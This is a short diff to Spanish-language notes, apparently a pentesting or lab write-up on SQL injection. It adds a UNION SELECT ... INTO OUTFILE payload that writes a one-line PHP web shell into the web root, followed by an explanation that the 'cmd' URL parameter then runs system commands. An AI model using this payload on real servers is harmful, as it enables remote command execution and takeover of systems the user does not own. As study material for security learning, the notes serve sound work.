@@ -39,3 +39,6 @@ Validaremos si somos capacidades de depositar contenido en una ruta
 `' union select "probando" into outfile "/var/www/html/prueba.txt"-- -` somos capaces de poder depositar contenido en diversas rutas
 
 Como interpreta PHP la idea es inyectara un archivo de este tipo
+`' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/prueba.php"-- -`
+
+Esto nos permite desde la URL acceder a `prueba.php` y con el parámetro `cmd` ejecutar comandos en el sistema
